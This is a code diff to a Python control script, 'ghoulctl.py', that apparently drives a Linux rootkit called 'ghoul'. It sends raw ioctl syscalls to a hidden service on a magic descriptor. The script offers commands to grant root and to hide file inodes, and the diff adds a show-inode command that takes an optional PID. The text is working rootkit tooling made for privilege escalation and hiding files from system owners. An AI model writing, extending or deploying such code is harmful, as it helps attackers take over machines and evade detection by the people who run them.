@@ -2,9 +2,12 @@
 import os
 import sys
 import ctypes
+import struct
 
 
-syscall = ctypes.CDLL(None).syscall
+_ioctl = ctypes.CDLL(None).syscall
+_ioctl.restype = ctypes.c_long
+_ioctl.argtypes = ctypes.c_long, ctypes.c_uint, ctypes.c_uint, ctypes.c_ulong
 SYSCALL_IOCTL_X86_64 = 16
 SERVICE_FD = int(os.environ.get('GHOUL_FD', 0)) or 666
 
@@ -15,12 +18,14 @@ SERVICE_PING = 3
 SERVICE_CHANGE_PING_ARG = 4
 SERVICE_GIVE_ROOT = 5
 SERVICE_HIDE_FILE_INODE = 6
+SERVICE_SHOW_FILE_INODE = 7
 
 PING_ARG = int(os.environ.get('GHOUL_PING_ARG', 0)) or 666
+ALL_PIDS = 0
 
 
 def ioctl(fd: int, cmd: int, arg: int):
-    return syscall(SYSCALL_IOCTL_X86_64, fd, cmd, arg)
+    return _ioctl(SYSCALL_IOCTL_X86_64, fd, cmd, arg)
 
 
 def show():
@@ -68,6 +73,21 @@ def hide_inode():
     ioctl(SERVICE_FD, SERVICE_HIDE_FILE_INODE, int(sys.argv[2]))
 
 
+def show_inode():
+    if len(sys.argv) < 3:
+        print('Usage: ./ghoulctl.py show-inode INODE [PID]')
+        exit()
+    inode = int(sys.argv[2])
+    try:
+        pid = int(sys.argv[3])
+    except IndexError:
+        pid = ALL_PIDS
+    
+    request_info = struct.pack('@Li', inode, pid)
+    info_ptr = ctypes.addressof(ctypes.c_buffer(request_info))
+    ioctl(SERVICE_FD, SERVICE_SHOW_FILE_INODE, info_ptr)
+
+
 def main():
     if len(sys.argv) < 2:
         print('Usage: ./ghoulctl.py COMMAND [ARGS]...')
@@ -88,6 +108,8 @@ def main():
         give_root()
     elif cmd == 'hide-inode':
         hide_inode()
+    elif cmd == 'show-inode':
+        show_inode()
     else:
         print(f'ERROR: unknown command {cmd}')
 
